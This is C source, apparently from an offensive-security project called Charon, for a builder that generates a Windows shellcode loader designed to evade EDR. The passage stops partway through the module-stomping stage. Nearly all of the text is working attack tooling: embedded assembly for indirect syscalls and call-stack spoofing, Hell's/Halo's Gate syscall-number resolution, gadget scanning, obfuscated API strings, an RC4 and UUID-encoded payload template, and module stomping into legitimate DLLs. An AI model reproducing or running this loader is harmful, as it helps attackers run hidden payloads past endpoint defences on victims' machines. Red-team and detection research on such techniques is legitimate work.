/*
 * ======================================================================================
 *  Charon - Artifact Builder & Obfuscator
 * ======================================================================================
 *
 *  Purpose:
 *      Generates a standalone executable (CharonArtifact.exe) designed to
 *      execute shellcode while evading EDR (Endpoint Detection and Response)
 *      hooks.
 *
 *  Key Techniques:
 *      1. Indirect Syscalls: Bypasses user-mode hooks by executing the
 *         'syscall' instruction within the memory space of ntdll.dll.
 *      2. Stack Spoofing (SilentMoonwalk): Manipulates the call stack to make
 *         syscalls appear as if they originated from legitimate APIs.
 *         It dynamically calculates the correct stack frame size for the
 *         spoofed return address to ensure stability and stealth.
 *      3. Dynamic Gadget Search: Scans loaded modules for 'jmp REG' gadgets
 *         across all non-volatile registers (RBX, RDI, RSI, R12-R15).
 *      4. Module Stomping: Injects the payload into the .text section of a
 *         legitimate DLL (e.g., Chakra.dll) to back the execution with a valid
 *         file on disk.
 *      5. Payload Protection: Uses RC4 encryption and 'KeyGuard' (runtime key
 *         calculation) to prevent static analysis of the payload.
 *      6. UUID Encoding: Encodes the payload as a list of UUID strings to
 *         disrupt entropy-based scanning and signature matching.
 *
 *  Author: vari.sh
 * ======================================================================================
 */

#define _CRT_SECURE_NO_WARNINGS
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <windows.h>

// =================================================================================
//  PART 1: EMBEDDED ASSEMBLY (STACK SPOOFER & INDIRECT SYSCALL ENGINE)
// =================================================================================
// This string contains the assembly code that handles the low-level stack
// manipulation and system call execution. It is written to 'syscalls.asm' and
// compiled by ML64.
const char *g_HellHallAsm =
    "EXTERN qTableAddr:QWORD\n"
    "EXTERN qGadgetAddress:QWORD\n"
    "EXTERN qGadgetType:DWORD\n"
    "EXTERN qFrameSize:DWORD\n"
    "EXTERN qSavedReg:QWORD\n"
    "EXTERN qSavedRetAddr:QWORD\n"
    ".code\n"
    "\n"

    // -----------------------------------------------------------------------
    // SetTableAddr: Configures the engine with necessary pointers.
    // RCX = Table Address, RDX = Gadget Address, R8 = Gadget Type, R9 =
    // FrameSize
    // -----------------------------------------------------------------------
    "    PUBLIC SetTableAddr\n"
    "    SetTableAddr PROC\n"
    "        mov qTableAddr, rcx\n"
    "        mov qGadgetAddress, rdx\n"
    "        mov qGadgetType, r8d\n"
    "        mov qFrameSize, r9d\n"
    "        xor rax, rax\n"
    "        inc rax\n"
    "        ret\n"
    "    SetTableAddr ENDP\n"
    "\n"

    // -----------------------------------------------------------------------
    // SyscallExec: The core evasion routine.
    // 1. Backs up the register we are about to use for the gadget.
    // 2. Prepares the stack to look like a legitimate return.
    // 3. Jumps to the 'jmp REG' gadget in ntdll/kernel32.
    // -----------------------------------------------------------------------
    "    SyscallExec PROC\n"
    "        mov r10, rcx\n"
    "        pop rcx             ; Pop Return Address\n"
    "        mov qSavedRetAddr, rcx\n"
    "        mov r11, rax        ; Save Syscall Index (RAX) to R11\n"
    "\n"
    "        ; Save RSI/RDI to Stack (PUSH)\n"
    "        push rsi\n"
    "        push rdi\n"
    "\n"
    "        ; Spoof Stack Frame Size\n"
    "        xor rax, rax\n"
    "        mov eax, qFrameSize\n"
    "        sub rsp, rax\n"
    "\n"
    "        ; Copy Stack Arguments (Arg5+) to New Stack\n"
    "        ; Offset calc: OldRSP(AfterPop) + 20h = Arg5.\n"
    "        ; Current RSP = OldRSP(AfterPop) - 16(Pushes) - FrameSize.\n"
    "        ; Arg5 - CurrentRSP = 20h + 10h + FrameSize = FrameSize + 30h.\n"
    "        lea rsi, [rsp + rax + 30h]  ; Source: Old Args\n"
    "        lea rdi, [rsp + 20h]        ; Dest: New RSP + 20h\n"
    "        mov rcx, 10h                ; Copy 128 bytes\n"
    "        cld\n"
    "        rep movsq\n"
    "\n"
    "        ; Restore Syscall Index\n"
    "        mov rax, r11\n"
    "\n"
    "        cmp qGadgetType, 0\n"
    "        je UseRBX\n"
    "        cmp qGadgetType, 1\n"
    "        je UseRDI\n"
    "        cmp qGadgetType, 2\n"
    "        je UseRSI\n"
    "        cmp qGadgetType, 3\n"
    "        je UseR12\n"
    "        cmp qGadgetType, 4\n"
    "        je UseR13\n"
    "        cmp qGadgetType, 5\n"
    "        je UseR14\n"
    "        cmp qGadgetType, 6\n"
    "        je UseR15\n"
    "        jmp UseRBX\n"
    "\n"
    // --- Register Specific Chains ---
    // Each block saves the register, loads the return address, and jumps to the
    // call execution
    "    UseRBX:\n"
    "        mov qSavedReg, rbx\n"
    "        lea rbx, BackFromKernel\n"
    "        jmp DoCall\n"
    "    UseRDI:\n"
    "        mov qSavedReg, rdi\n"
    "        lea rdi, BackFromKernel\n"
    "        jmp DoCall\n"
    "    UseRSI:\n"
    "        mov qSavedReg, rsi\n"
    "        lea rsi, BackFromKernel\n"
    "        jmp DoCall\n"
    "    UseR12:\n"
    "        mov qSavedReg, r12\n"
    "        lea r12, BackFromKernel\n"
    "        jmp DoCall\n"
    "    UseR13:\n"
    "        mov qSavedReg, r13\n"
    "        lea r13, BackFromKernel\n"
    "        jmp DoCall\n"
    "    UseR14:\n"
    "        mov qSavedReg, r14\n"
    "        lea r14, BackFromKernel\n"
    "        jmp DoCall\n"
    "    UseR15:\n"
    "        mov qSavedReg, r15\n"
    "        lea r15, BackFromKernel\n"
    "        jmp DoCall\n"
    "\n"

    // --- Execution Logic ---
    "    DoCall:\n"
    "        push rdx\n"
    "        mov rdx, 20h\n"
    "        mul rdx\n"
    "        mov rdx, qTableAddr\n"
    "        add rdx, rax\n"
    "        mov rax, [rdx + 08h]\n"
    "        mov r11, [rdx + 10h]\n"
    "        pop rdx\n"
    "        mov rcx, r10\n"
    "        push qGadgetAddress\n"
    "        jmp r11\n"
    "\n"

    // --- Return Logic ---
    // After the syscall returns, execution flows here. We must restore valid
    // program state.
    "    BackFromKernel:\n"
    "        cmp qGadgetType, 0\n"
    "        je RestRBX\n"
    "        cmp qGadgetType, 1\n"
    "        je RestRDI\n"
    "        cmp qGadgetType, 2\n"
    "        je RestRSI\n"
    "        cmp qGadgetType, 3\n"
    "        je RestR12\n"
    "        cmp qGadgetType, 4\n"
    "        je RestR13\n"
    "        cmp qGadgetType, 5\n"
    "        je RestR14\n"
    "        cmp qGadgetType, 6\n"
    "        je RestR15\n"
    "        jmp RestRBX\n"
    "\n"
    // Restore the non-volatile register we hijacked
    "    RestRBX:\n"
    "        mov rbx, qSavedReg\n"
    "        jmp Fin\n"
    "    RestRDI:\n"
    "        mov rdi, qSavedReg\n"
    "        jmp Fin\n"
    "    RestRSI:\n"
    "        mov rsi, qSavedReg\n"
    "        jmp Fin\n"
    "    RestR12:\n"
    "        mov r12, qSavedReg\n"
    "        jmp Fin\n"
    "    RestR13:\n"
    "        mov r13, qSavedReg\n"
    "        jmp Fin\n"
    "    RestR14:\n"
    "        mov r14, qSavedReg\n"
    "        jmp Fin\n"
    "    RestR15:\n"
    "        mov r15, qSavedReg\n"
    "        jmp Fin\n"
    "    Fin:\n"
    "        ; Restore Stack\n"
    "        mov rcx, rax        ; Save Syscall Status (RAX)\n"
    "        xor rax, rax\n"
    "        mov eax, qFrameSize\n"
    "        add rsp, rax\n"
    "        pop rdi\n"
    "        pop rsi\n"
    "        mov rax, rcx        ; Restore Syscall Status\n"
    "        \n"
    "        jmp qSavedRetAddr\n"
    "    SyscallExec ENDP\n";

// =================================================================================
//  PART 2: MONOLITHIC C TEMPLATE (THE ARTIFACT)
// =================================================================================
// This string contains the source code for the generated artifact.
// It is written to 'artifact.c' and compiled.
const char *g_StubTemplate =
    // Headers
    "#include <windows.h>\n"
    "#include <stdio.h>\n"
    "#include <string.h>\n"
    // "#include \"sqlite-amalgamation-3510200/sqlite3.h\"\n"
    "\n"
    "#define INVALID_SSN ((DWORD64)-1)\n"
    "#define DEFAULT_FRAME_SIZE 0x28\n"
    "\n"
    // --- OPSEC TOGGLE ---
    // Comment the line below to enable debug prints
    "#define printf(...) \n"
    "\n"

    // -------------------------------------------------------------------------
    // [SECTION 1] GLOBALS FOR ASM
    // These globals bridge the C code and the Assembly engine.
    // -------------------------------------------------------------------------
    "void* qTableAddr = NULL;\n"     // Base address of the syscall table
    "void* qGadgetAddress = NULL;\n" // Address of the found 'jmp REG' gadget
    "DWORD qGadgetType = 0;\n"      // Type of gadget found (0=RBX, 1=RDI, etc.)
    "DWORD qFrameSize = 0;\n"       // Spoofed Frame Size\n"
    "void* qSavedReg = NULL;\n"     // Space to save the register context\n"
    "void* qSavedRetAddr = NULL;\n" // Space to save the return address\n"
    "\n"

    // -------------------------------------------------------------------------
    // [SECTION 2] INTERNAL STRUCTS
    // -------------------------------------------------------------------------
    // UNWIND_CODE structure for stack walking
    "typedef struct _UNWIND_CODE {\n"
    "    BYTE CodeOffset;\n"
    "    BYTE UnwindOp : 4;\n"
    "    BYTE OpInfo : 4;\n"
    "} UNWIND_CODE, *PUNWIND_CODE;\n"
    "\n"
    // UNWIND_INFO structure
    "typedef struct _UNWIND_INFO {\n"
    "    BYTE Version : 3;\n"
    "    BYTE Flags : 5;\n"
    "    BYTE SizeOfProlog;\n"
    "    BYTE CountOfCodes;\n"
    "    BYTE FrameRegister : 4;\n"
    "    BYTE FrameOffset : 4;\n"
    "    UNWIND_CODE UnwindCode[1];\n"
    "} UNWIND_INFO, *PUNWIND_INFO;\n"
    "\n"
    // Syscall Entry structure
    "typedef struct _SYSCALL_ENTRY {\n"
    "    PVOID pAddress;      // 0x00 - Original Address\n"
    "    DWORD64 dwSsn;       // 0x08 - Syscall Number (SSN)\n"
    "    PVOID pSyscallRet;   // 0x10 - Address of 'syscall; ret' instruction\n"
    "    DWORD64 dwHash;      // 0x18 - Hash of the function name\n"
    "} SYSCALL_ENTRY, *PSYSCALL_ENTRY;\n"
    "\n"
    // Syscall List
    "typedef struct _SYSCALL_LIST {\n"
    "    DWORD Count;\n"
    "    SYSCALL_ENTRY Entries[512];\n"
    "} SYSCALL_LIST, *PSYSCALL_LIST;\n"
    "\n"
    // Native definitions needed for traversing PEB (Process Environment Block)
    "typedef struct _USTRING { DWORD Length; DWORD MaximumLength; PVOID "
    "Buffer; } USTRING, *PUSTRING;\n"
    "typedef struct _PEB_LDR_DATA { ULONG Length; BOOLEAN Initialized; HANDLE "
    "SsHandle; LIST_ENTRY InLoadOrderModuleList; } PEB_LDR_DATA, "
    "*PPEB_LDR_DATA;\n"
    "typedef struct _LDR_DATA_TABLE_ENTRY { LIST_ENTRY InLoadOrderLinks; "
    "LIST_ENTRY InMemoryOrderLinks; LIST_ENTRY InInitializationOrderLinks; "
    "PVOID DllBase; } LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;\n"
    "typedef struct _PEB { BYTE Reserved[24]; PPEB_LDR_DATA Ldr; } PEB, "
    "*PPEB;\n"
    "\n"

    // --- GLOBALS ---\n"
    "SYSCALL_LIST SyscallList;\n"
    "PVOID g_pSystemFunction032 = NULL;\n"
    "PVOID g_pLoadLibraryExA = NULL;\n"
    "extern void SetTableAddr(PVOID pTable, PVOID pGadget, DWORD dwType, DWORD "
    "dwFrameSize);\n"
    "extern void Fnc0000(); // Reference to the base of the assembly stubs\n"
    "\n"
    // Decodes a raw UUID string (fixed 36 chars) into 16 bytes.
    // Format: xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
    "void UUIDToBytes(const char* uuidStr, unsigned char* outBuf) {\n"
    "    int byteIdx = 0;\n"
    "    for (int i = 0; i < 36; i++) {\n"
    "        if (uuidStr[i] == '-') continue;\n"
    "\n"
    "        char c = uuidStr[i];\n"
    "        unsigned char val = 0;\n"
    "\n"
    "        if (c >= '0' && c <= '9') val = c - '0';\n"
    "        else if (c >= 'A' && c <= 'F') val = c - 'A' + 10;\n"
    "        else if (c >= 'a' && c <= 'f') val = c - 'a' + 10;\n"
    "\n"
    "        if (byteIdx % 2 == 0) {\n"
    "            outBuf[byteIdx / 2] = val << 4; // High nibble\n"
    "        } else {\n"
    "            outBuf[byteIdx / 2] |= val;     // Low nibble\n"
    "        }\n"
    "        byteIdx++;\n"
    "    }\n"
    "}\n"
    "\n"

    // --- [SECTION 3] HELPERS ---\n"

    // djb2: Simple hash function for string comparison
    "DWORD64 djb2(PBYTE str) {\n"
    "    DWORD64 dwHash = 0x7734773477347734;\n"
    "    INT c;\n"
    "    while (c = (INT)((char)*str++)) dwHash = ((dwHash << 0x5) + dwHash) + "
    "c;\n"
    "    return dwHash;\n"
    "}\n"
    "\n"
    // GetNextSyscallInstruction: Scans forward to find valid 'syscall; ret'
    // bytes
    "PVOID GetNextSyscallInstruction(PVOID pAddress) {\n"
    "    for (DWORD i = 0; i <= 32; i++) {\n"
    "        if (*((PBYTE)pAddress + i) == 0x0f && *((PBYTE)pAddress + i + 1) "
    "== 0x05 && *((PBYTE)pAddress + i + 2) == 0xc3) {\n"
    "            return (PVOID)((ULONG_PTR)pAddress + i);\n"
    "        }\n"
    "    }\n"
    "    return NULL;\n"
    "}\n"
    "\n"
    // GetSSN: Extracts the System Service Number from a function address or its
    // neighborhood
    "DWORD64 GetSSN(PVOID pAddress) {\n"
    "    if (*((PBYTE)pAddress) == 0x4c && *((PBYTE)pAddress + 3) == 0xb8) "
    "return *(DWORD*)((PBYTE)pAddress + 4);\n"
    "    for (WORD idx = 1; idx <= 32; idx++) {\n"
    "        // Check neighbors if the function is hooked\n"
    "        if (*((PBYTE)pAddress + idx * 32) == 0x4c && *((PBYTE)pAddress + "
    "idx * 32 + 3) == 0xb8)\n"
    "            return *((PBYTE)pAddress + idx * 32 + 4) - idx;\n"
    "        if (*((PBYTE)pAddress - idx * 32) == 0x4c && *((PBYTE)pAddress - "
    "idx * 32 + 3) == 0xb8)\n"
    "            return *((PBYTE)pAddress - idx * 32 + 4) + idx;\n"
    "    }\n"
    "    return INVALID_SSN;\n"
    "}\n"
    "\n"
    // FindGadgetInModule: Scans a module for 'jmp REG' opcodes to use for stack
    // spoofing
    "PVOID FindGadgetInModule(const char* sModule, DWORD* outType) {\n"
    "    PVOID pModule = (PVOID)GetModuleHandleA(sModule);\n"
    "    if (!pModule) return NULL;\n"
    "    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pModule;\n"
    "    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((ULONG_PTR)pModule + "
    "pDos->e_lfanew);\n"
    "    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNt);\n"
    "    for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++) {\n"
    "        if (pSection[i].Characteristics & 0x20000020) {\n"
    "// Check for Executable section\n"
    "            PBYTE pStart = (PBYTE)((ULONG_PTR)pModule + "
    "pSection[i].VirtualAddress);\n"
    "            DWORD dwSize = pSection[i].Misc.VirtualSize;\n"
    "            for (DWORD z = 0; z < dwSize - 2; z++) {\n"
    "                if (pStart[z] == 0xFF && pStart[z+1] == 0xE3) { *outType "
    "= 0; return (PVOID)(pStart + z); }\n"
    "                if (pStart[z] == 0xFF && pStart[z+1] == 0xE7) { *outType "
    "= 1; return (PVOID)(pStart + z); }\n"
    "                if (pStart[z] == 0xFF && pStart[z+1] == 0xE6) { *outType "
    "= 2; return (PVOID)(pStart + z); }\n"
    "                if (pStart[z] == 0x41 && pStart[z+1] == 0xFF && "
    "pStart[z+2] == 0xE4) { *outType = 3; return (PVOID)(pStart + z); }\n"
    "                if (pStart[z] == 0x41 && pStart[z+1] == 0xFF && "
    "pStart[z+2] == 0xE5) { *outType = 4; return (PVOID)(pStart + z); }\n"
    "                if (pStart[z] == 0x41 && pStart[z+1] == 0xFF && "
    "pStart[z+2] == 0xE6) { *outType = 5; return (PVOID)(pStart + z); }\n"
    "                if (pStart[z] == 0x41 && pStart[z+1] == 0xFF && "
    "pStart[z+2] == 0xE7) { *outType = 6; return (PVOID)(pStart + z); }\n"
    "            }\n"
    "        }\n"
    "    }\n"
    "    return NULL;\n"
    "}\n"
    "\n"
    "typedef HMODULE (WINAPI *fnLoadLibraryExA)(LPCSTR, HANDLE, DWORD);\n"
    "\n"
    // Helper to find export by hash
    "PVOID GetProcAddressByHash(HMODULE hMod, DWORD64 hHash) {\n"
    "    if (!hMod) return NULL;\n"
    "    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hMod;\n"
    "    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((PBYTE)hMod + "
    "pDos->e_lfanew);\n"
    "    PIMAGE_EXPORT_DIRECTORY pExport = "
    "(PIMAGE_EXPORT_DIRECTORY)((PBYTE)hMod + "
    "pNt->OptionalHeader.DataDirectory[0].VirtualAddress);\n"
    "    DWORD dwExportSize = pNt->OptionalHeader.DataDirectory[0].Size;\n"
    "    PBYTE pExportBase = (PBYTE)pExport;\n"
    "    PBYTE pExportEnd = pExportBase + dwExportSize;\n"
    "    PDWORD pdwFunctions = (PDWORD)((PBYTE)hMod + "
    "pExport->AddressOfFunctions);\n"
    "    PDWORD pdwNames = (PDWORD)((PBYTE)hMod + pExport->AddressOfNames);\n"
    "    PWORD pwOrdinals = (PWORD)((PBYTE)hMod + "
    "pExport->AddressOfNameOrdinals);\n"
    "    for (DWORD i = 0; i < pExport->NumberOfNames; i++) {\n"
    "        char* szName = (char*)((PBYTE)hMod + pdwNames[i]);\n"
    "        if (djb2((PBYTE)szName) == hHash) {\n"
    "            PVOID pFunc = (PBYTE)hMod + pdwFunctions[pwOrdinals[i]];\n"
    "            if (pFunc >= (PVOID)pExport && pFunc < (PVOID)((PBYTE)pExport "
    "+ dwExportSize)) {\n"
    "                 // Forwarded export: DLL.Function\n"
    "                 char szFwd[260]; strncpy(szFwd, (char*)pFunc, 260);\n"
    "                 char* pDot = strchr(szFwd, '.');\n"
    "                 if(pDot) {\n"
    "                     *pDot = 0;\n"
    "                     char szDll[260]; sprintf(szDll, \"%s.dll\", szFwd);\n"
    "                     if (g_pLoadLibraryExA) {\n"
    "                         return "
    "GetProcAddress(((fnLoadLibraryExA)g_pLoadLibraryExA)(szDll, NULL, 0), "
    "pDot + 1);\n"
    "                     }\n"
    "                     return NULL;\n"
    "                 }\n"
    "            }\n"
    "            return pFunc;\n"
    "        }\n"
    "    }\n"
    "    return NULL;\n"
    "}\n"
    "\n"

    // -------------------------------------------------------------------------
    // [SECTION 4] INIT ENGINE
    // -------------------------------------------------------------------------
    "typedef PRUNTIME_FUNCTION (NTAPI *fnRtlLookupFunctionEntry)(DWORD64 "
    "ControlPc, PDWORD64 ImageBase, PUNWIND_HISTORY_TABLE HistoryTable);\n"
    "\n"
    // -----------------------------------------------------------------------
    // CalcFrameSize: Calculates the stack frame size of a target function.
    // -----------------------------------------------------------------------
    // This function parses the .pdata (Exception Directory) of a module to find
    // the UNWIND_INFO for a given function. It then iterates through the unwind
    // codes to calculate exactly how much stack space the function allocates.
    //
    // We use this to 'spoof' a legitimate stack frame size. By making our
    // malicious syscall stack look exactly like a call from
    // 'BaseThreadInitThunk' or similar, we blend in with normal execution flow.
    "DWORD CalcFrameSize(PVOID pFunc) {\n"
    "    char sK32[] = {'k','e','r','n','e','l','3','2','.','d','l','l',0};\n"
    "    char sRtl[] = "
    "{'R','t','l','L','o','o','k','u','p','F','u','n','c','t','i','o','n','E','"
    "n','t','r','y',0};\n"
    "    \n"
    // Dynamically resolve RtlLookupFunctionEntry to access Unwind Info
    "    PVOID pH = GetProcAddress(GetModuleHandleA(sK32), sRtl);\n"
    "    if(!pH) return DEFAULT_FRAME_SIZE;\n"
    "    fnRtlLookupFunctionEntry RtlLookup = (fnRtlLookupFunctionEntry)pH;\n"
    "    DWORD64 ImageBase;\n"
    "    PRUNTIME_FUNCTION pRF = RtlLookup((DWORD64)pFunc, &ImageBase, NULL);\n"
    "    if(!pRF) return DEFAULT_FRAME_SIZE;\n"
    "    \n"
    "    PUNWIND_INFO pUI = (PUNWIND_INFO)(ImageBase + pRF->UnwindData);\n"
    "    DWORD size = 0;\n"
    "    \n"
    // Parse Unwind Codes to sum up stack allocations
    "    for(int i=0; i<pUI->CountOfCodes; i++) {\n"
    "        UNWIND_CODE* pCode = &pUI->UnwindCode[i];\n"
    "        if(pCode->UnwindOp == 2) { size += (pCode->OpInfo * 8) + 8; }     "
    " // UWOP_ALLOC_SMALL\n"
    "        else if(pCode->UnwindOp == 0) { size += 8; }                      "
    "  // UWOP_PUSH_NONVOL\n"
    "        else if(pCode->UnwindOp == 4) { i++; }                            "
    "  // UWOP_SAVE_NONVOL\n"
    "        else if(pCode->UnwindOp == 1) {                                   "
    "  // UWOP_ALLOC_LARGE\n"
    "            if(pCode->OpInfo == 0) { size += "
    "(*(USHORT*)&pUI->UnwindCode[i+1]) * 8; i++; }\n"
    "            else { size += *(DWORD*)&pUI->UnwindCode[i+1]; i+=2; }\n"
    "        }\n"
    "    }\n"
    // Align to 16 bytes for x64 stack alignment compliance
    "    if(size % 16 != 0) size = (size + 16) & ~15;\n"
    "    if(size < 0x100) size = 0x100; // Enforce minimum frame size for "
    "stability\n"
    "    return size;\n"
    "}\n"
    "\n"
    // -----------------------------------------------------------------------
    // InitApi: Initializes the Evasion Engine.
    // -----------------------------------------------------------------------
    // 1. Locates Ntdll.dll base address.
    // 2. Finds a suitable 'jmp REG' gadget for stack spoofing.
    // 3. Calculates the frame size of a legitimate function to mimic.
    // 4. Resolves syscall numbers (SSNs) via Hell's Gate/Halo's Gate.
    "BOOL InitApi() {\n"
    "    char sNt[] = {'n','t','d','l','l','.','d','l','l',0};\n"
    "    PVOID ntdllBase = GetModuleHandleA(sNt);\n"
    "    if(!ntdllBase) return FALSE;\n"
    "    \n"
    "    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)ntdllBase;\n"
    "    if (pDos->e_magic != IMAGE_DOS_SIGNATURE) return FALSE;\n"
    "    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((PBYTE)ntdllBase + "
    "pDos->e_lfanew);\n"
    "    if (pNt->Signature != IMAGE_NT_SIGNATURE) return FALSE;\n"
    "    \n"
    "    PIMAGE_EXPORT_DIRECTORY pExport = "
    "(PIMAGE_EXPORT_DIRECTORY)((PBYTE)ntdllBase + "
    "pNt->OptionalHeader.DataDirectory[0].VirtualAddress);\n"
    "    PDWORD pdwFunctions = (PDWORD)((PBYTE)ntdllBase + "
    "pExport->AddressOfFunctions);\n"
    "    PDWORD pdwNames = (PDWORD)((PBYTE)ntdllBase + "
    "pExport->AddressOfNames);\n"
    "    PWORD pwOrdinals = (PWORD)((PBYTE)ntdllBase + "
    "pExport->AddressOfNameOrdinals);\n"
    "    \n"
    "    DWORD idx = 0;\n"
    "    \n"
    // [STEP 1] Find Stack Spoof Gadget
    // We look for 'jmp RBX', 'jmp RDI', etc. in kernel32 or ntdll.
    // This gadget allows us to jump to the syscall instruction while
    // controlling registers.
    "    char sK32[] = {'k','e','r','n','e','l','3','2','.','d','l','l',0};\n"
    "    \n"
    // Resolve LoadLibraryExA
    "    char sLoad[] = "
    "{'L','o','a','d','L','i','b','r','a','r','y','E','x','A',0};\n"
    "    g_pLoadLibraryExA = GetProcAddress(GetModuleHandleA(sK32), sLoad);\n"
    "    if(!g_pLoadLibraryExA) { printf(\"[!] Failed to resolve "
    "LoadLibraryExA\\n\"); return FALSE; }\n"
    "    \n"
    "    qGadgetAddress = FindGadgetInModule(sK32, &qGadgetType);\n"
    "    if(!qGadgetAddress) qGadgetAddress = FindGadgetInModule(sNt, "
    "&qGadgetType);\n"
    "    if(!qGadgetAddress) { printf(\"[!] Gadget not found\\n\"); return "
    "FALSE; }\n"
    "    \n"
    // [STEP 2] Calculate Spoof Frame Size
    // We mimic 'BaseThreadInitThunk' to make the stack look like a fresh thread
    // start.
    "    char sBase[] = "
    "{'B','a','s','e','T','h','r','e','a','d','I','n','i','t','T','h','u','n','"
    "k',0};\n"
    "    PVOID pTarget = GetProcAddress(GetModuleHandleA(sK32), sBase);\n"
    "    if(pTarget) qFrameSize = CalcFrameSize(pTarget);\n"
    "    else qFrameSize = 0x38; // Fallback\n"
    "    \n"
    "    printf(\"[+] Found Gadget at %p (Type: %d) | Frame: 0x%X\\n\", "
    "qGadgetAddress, "
    "qGadgetType, qFrameSize);\n"
    "    SetTableAddr(SyscallList.Entries, qGadgetAddress, qGadgetType, "
    "qFrameSize);\n"
    "    \n"
    // [STEP 3] Resolve Syscalls (Halos Gate)
    // Walk global exports of ntdll.dll to find syscalls and their SSNs.
    "    for (WORD i = 0; i < pExport->NumberOfNames; i++) {\n"
    "        PCHAR pcName = (PCHAR)((PBYTE)ntdllBase + pdwNames[i]);\n"
    "        PVOID pAddress = (PBYTE)ntdllBase + pdwFunctions[pwOrdinals[i]];\n"
    "        \n"
    "        USHORT prefix = *(USHORT*)pcName;\n"
    "        if (prefix != 0x744E && prefix != 0x775A) continue; // Filter for "
    "'Nt' or 'Zw'\n"
    "        \n"
    "        DWORD64 dwSsn = GetSSN(pAddress);\n"
    "        if (dwSsn == INVALID_SSN) continue;\n"
    "        \n"
    "        PVOID pSyscallRet = GetNextSyscallInstruction(pAddress);\n"
    "        if (!pSyscallRet) continue;\n"
    "        \n"
    "        // Store entry in our internal list\n"
    "        SyscallList.Entries[idx].pAddress = pAddress;\n"
    "        SyscallList.Entries[idx].dwSsn = dwSsn;\n"
    "        SyscallList.Entries[idx].pSyscallRet = pSyscallRet;\n"
    "        SyscallList.Entries[idx].dwHash = djb2((PBYTE)pcName);\n"
    "        \n"
    "        idx++;\n"
    "        if (idx >= 512) break;\n"
    "    }\n"
    "    SyscallList.Count = idx;\n"
    "    \n"
    // Resolve SystemFunction032 for data decryption
    "    char sAdv[] = {'a','d','v','a','p','i','3','2','.','d','l','l',0};\n"
    "    g_pSystemFunction032 = "
    "GetProcAddressByHash(((fnLoadLibraryExA)g_pLoadLibraryExA)(sAdv, NULL, "
    "0), "
    "0xB1E6B89241A41B94);\n"
    "    if(!g_pSystemFunction032) printf(\"[!] Failed to resolve "
    "SystemFunction032\\n\");\n"
    "    \n"
    "    return TRUE;\n"
    "}\n"
    "\n"
    "typedef NTSTATUS (NTAPI *fnNtProtectVirtualMemory)(HANDLE, PVOID*, "
    "PSIZE_T, ULONG, PULONG);\n"
    "\n"
    // -------------------------------------------------------------------------
    // [SECTION 5] CONFIG & PAYLOAD
    // -------------------------------------------------------------------------
    "#define KEY_SIZE 16\n"
    "#define HINT_BYTE {{HINT_BYTE}}\n"
    "#define UUID_COUNT {{UUID_COUNT}}\n"
    "\n"
    "unsigned char Key[] = { {{KEY_BYTES}} };\n"
    "\n"
    "typedef NTSTATUS(NTAPI* fnSystemFunction032)(USTRING* Img, USTRING* "
    "Key);\n"
    "typedef NTSTATUS (NTAPI *fnNtAllocateVirtualMemory)(HANDLE, PVOID*, "
    "ULONG_PTR, PSIZE_T, ULONG, ULONG);\n"
    "typedef NTSTATUS (NTAPI *fnTpAllocWork)(PVOID*, PVOID, PVOID, PVOID);\n"
    "typedef NTSTATUS (NTAPI *fnTpPostWork)(PVOID);\n"
    "typedef NTSTATUS (NTAPI *fnTpWaitForWork)(PVOID, BOOLEAN);\n"
    "typedef NTSTATUS (NTAPI *fnTpReleaseWork)(PVOID);\n"
    "\n"

    // -------------------------------------------------------------------------
    // [ENTRY POINT]
    // -------------------------------------------------------------------------
    // Uncomment main and comment WinMain to enable console mode
    // "int main() {\n"
    "   int APIENTRY WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR "
    "lpCmdLine, int nCmdShow) {\n"
    // "    setvbuf(stdout, NULL, _IONBF, 0);\n"
    "    PVOID pAddr = NULL; SIZE_T sSize = UUID_COUNT * 16; DWORD dwOld = 0; "
    "HANDLE hProc = (HANDLE)-1;\n"
    "    \n"
    "    printf(\"[+] Initializing Charon Engine...\\n\");\n"
    // "    printf(\"SQLite Version: %s\\n\", sqlite3_libversion());\n"
    "    if(!InitApi()) { printf(\"[!] InitApi Failed\\n\"); return 1; }\n"
    "\n"
    // -------------------------------------------------------------------------
    // [STAGE 1] Module Stomping Setup
    // We load a legitimate DLL (Chakra.dll) to use as a backing file for our
    // payload. This avoids 'unbacked executable memory' indicators.
    // -------------------------------------------------------------------------
    "    printf(\"[+] Looking for a sacrificial DLL...\\n\");\n"
    "    HMODULE hSacrificial = NULL;\n"
    "    char s1[] = {'C','h','a','k','r','a','.','d','l','l',0};\n"
    "    hSacrificial = ((fnLoadLibraryExA)g_pLoadLibraryExA)(s1, NULL, 0x1);\n"
    "    if (!hSacrificial) {\n"
    "        char s2[] = {'j','s','c','r','i','p','t','9','.','d','l','l',0};\n"
    "        hSacrificial = ((fnLoadLibraryExA)g_pLoadLibraryExA)(s2, NULL, "
    "0x1);\n"
    "    }\n"
    "    if (!hSacrificial) {\n"
    "        char s3[] = {'M','i','a','c','r','o','m','e','.','d','l','l',0};\n"
    "        hSacrificial = ((fnLoadLibraryExA)g_pLoadLibraryExA)(s3, NULL, "
    "0x1);\n"
    "    }\n"
    "    if (!hSacrificial) {\n"
    "        char s4[] = "
    "{'X','p','s','S','e','r','v','i','c','e','s','.','d','l','l',0};\n"
    "        hSacrificial = ((fnLoadLibraryExA)g_pLoadLibraryExA)(s4, NULL, "
    "0x1);\n"
    "    }\n"
    "    if (!hSacrificial) { printf(\"[!] All candidates failed.\\n\"); "
    "return 1; }\n"
    "    \n"
    // Find .text section to inject into
    "    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hSacrificial;\n"
    "    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((PBYTE)hSacrificial + "
    "pDos->e_lfanew);\n"
    "    PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt);\n"
    "    for (int i = 0; i < pNt->FileHeader.NumberOfSections; i++) {\n"
